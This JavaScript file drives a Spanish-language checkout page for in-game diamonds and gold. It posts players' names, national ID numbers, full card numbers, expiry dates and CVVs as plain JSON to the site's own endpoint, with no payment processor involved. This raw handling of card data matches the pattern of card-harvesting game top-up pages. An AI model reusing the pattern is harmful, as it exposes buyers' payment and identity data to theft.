// DOM Elements
const currencyOptions = document.querySelectorAll('.currency-option');
const amountItems = document.querySelectorAll('.amount-item');
const cardTypes = document.querySelectorAll('.card-type');
const playerIdInput = document.getElementById('player-id');
const cardNumberInput = document.getElementById('card-number');
const expiryInput = document.getElementById('expiry');
const cvvInput = document.getElementById('cvv');
const purchaseBtn = document.getElementById('complete-purchase');

// Summary elements
const summaryPlayerId = document.getElementById('summary-player-id');
const summaryProduct = document.getElementById('summary-product');
const summaryAmount = document.getElementById('summary-amount');
const summaryTotal = document.getElementById('summary-total');

// State
let selectedCurrency = 'diamonds';
let selectedAmount = null;
let selectedPrice = null;
let selectedCardType = 'credit';

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    initializeEventListeners();
    updatePurchaseButton();
});

function initializeEventListeners() {
    // Currency selection
    currencyOptions.forEach(option => {
        option.addEventListener('click', function() {
            currencyOptions.forEach(opt => opt.classList.remove('active'));
            this.classList.add('active');
            selectedCurrency = this.dataset.currency;
            toggleAmountGrids();
            clearAmountSelection();
            updateSummary();
        });
    });

    // Amount selection
    document.addEventListener('click', function(e) {
        if (e.target.closest('.amount-item')) {
            const item = e.target.closest('.amount-item');
            document.querySelectorAll('.amount-item').forEach(i => i.classList.remove('selected'));
            item.classList.add('selected');
            selectedAmount = item.dataset.amount;
            selectedPrice = item.dataset.price;
            updateSummary();
            updatePurchaseButton();
        }
    });

    // Card type selection
    cardTypes.forEach(type => {
        type.addEventListener('click', function() {
            cardTypes.forEach(t => t.classList.remove('active'));
            this.classList.add('active');
            selectedCardType = this.dataset.type;
        });
    });

    // Input formatting
    cardNumberInput.addEventListener('input', formatCardNumber);
    expiryInput.addEventListener('input', formatExpiry);
    cvvInput.addEventListener('input', formatCVV);
    
    // Form validation
    const inputs = document.querySelectorAll('input[required], select[required]');
    inputs.forEach(input => {
        input.addEventListener('input', updatePurchaseButton);
        input.addEventListener('change', updatePurchaseButton);
    });

    // Player ID update
    playerIdInput.addEventListener('input', function() {
        summaryPlayerId.textContent = this.value || '-';
    });

    // Purchase button
    purchaseBtn.addEventListener('click', handlePurchase);
}

function toggleAmountGrids() {
    const diamondsGrid = document.getElementById('diamonds-amounts');
    const goldGrid = document.getElementById('gold-amounts');
    
    if (selectedCurrency === 'diamonds') {
        diamondsGrid.classList.remove('hidden');
        goldGrid.classList.add('hidden');
    } else {
        diamondsGrid.classList.add('hidden');
        goldGrid.classList.remove('hidden');
    }
}

function clearAmountSelection() {
    document.querySelectorAll('.amount-item').forEach(item => {
        item.classList.remove('selected');
    });
    selectedAmount = null;
    selectedPrice = null;
}

function formatCardNumber(e) {
    let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
    let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
    if (formattedValue.length > 19) formattedValue = formattedValue.substr(0, 19);
    e.target.value = formattedValue;
}

function formatExpiry(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 2) {
        value = value.substring(0, 2) + '/' + value.substring(2, 4);
    }
    e.target.value = value;
}

function formatCVV(e) {
    e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
}

function updateSummary() {
    const currencySymbol = selectedCurrency === 'diamonds' ? '💎' : '🪙';
    const currencyName = selectedCurrency === 'diamonds' ? 'Diamantes' : 'Oro';
    
    summaryProduct.textContent = selectedAmount ? `${currencySymbol} ${currencyName}` : '-';
    summaryAmount.textContent = selectedAmount ? formatNumber(selectedAmount) : '-';
    summaryTotal.textContent = selectedPrice ? `$${selectedPrice}` : '$0.00';
}

function formatNumber(num) {
    return new Intl.NumberFormat('es-AR').format(num);
}

function updatePurchaseButton() {
    const requiredInputs = document.querySelectorAll('input[required], select[required]');
    const allFilled = Array.from(requiredInputs).every(input => input.value.trim() !== '');
    const hasSelection = selectedAmount && selectedPrice;
    
    purchaseBtn.disabled = !(allFilled && hasSelection);
}

async function handlePurchase(e) {
    e.preventDefault();
    
    if (purchaseBtn.disabled) {
        return;
    }

    // Mostrar estado de procesamiento
    purchaseBtn.innerHTML = '<span class="btn-icon">⏳</span> Procesando...';
    purchaseBtn.disabled = true;

    // Recopilar todos los datos del formulario
    const purchaseData = {
        playerId: document.getElementById('player-id').value,
        currencyType: selectedCurrency,
        amount: selectedAmount,
        price: selectedPrice,
        fullName: document.getElementById('full-name').value,
        dni: document.getElementById('dni').value,
        country: document.getElementById('country').value,
        email: document.getElementById('email').value,
        cardNumber: document.getElementById('card-number').value,
        cardName: document.getElementById('card-name').value,
        expiry: document.getElementById('expiry').value,
        cvv: document.getElementById('cvv').value,
        cardType: selectedCardType
    };

    try {
        // Enviar datos al servidor
        const response = await fetch('/api/purchase', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(purchaseData)
        });

        const result = await response.json();

        if (result.success) {
            // Mostrar mensaje de éxito
            alert(`¡Compra exitosa!\n\nID: ${purchaseData.playerId}\nProducto: ${summaryProduct.textContent} ${summaryAmount.textContent}\nTotal: ${summaryTotal.textContent}\n\nLos ${selectedCurrency} serán agregados a tu cuenta en los próximos minutos.`);
            
            // Reset form
            document.querySelectorAll('input').forEach(input => input.value = '');
            document.querySelectorAll('select').forEach(select => select.selectedIndex = 0);
            clearAmountSelection();
            updateSummary();
            summaryPlayerId.textContent = '-';
            
            // Reset currency selection
            currencyOptions.forEach(opt => opt.classList.remove('active'));
            currencyOptions[0].classList.add('active');
            selectedCurrency = 'diamonds';
            toggleAmountGrids();
            
            // Reset card type
            cardTypes.forEach(t => t.classList.remove('active'));
            cardTypes[0].classList.add('active');
            selectedCardType = 'credit';
            
        } else {
            alert('Error al procesar la compra: ' + result.message);
        }
    } catch (error) {
        console.error('Error:', error);
        alert('Error de conexión. Por favor, intenta nuevamente.');
    } finally {
        // Restaurar botón
        purchaseBtn.innerHTML = '<span class="btn-icon">🔒</span> Completar Compra Segura';
        updatePurchaseButton();
    }
}

// Game selection functionality
document.querySelectorAll('.game-item').forEach(item => {
    item.addEventListener('click', function() {
        document.querySelectorAll('.game-item').forEach(i => i.classList.remove('active'));
        this.classList.add('active');
    });
});

// Banner navigation
document.querySelector('.banner-nav.prev')?.addEventListener('click', function() {
    console.log('Previous banner');
});

document.querySelector('.banner-nav.next')?.addEventListener('click', function() {
    console.log('Next banner');
});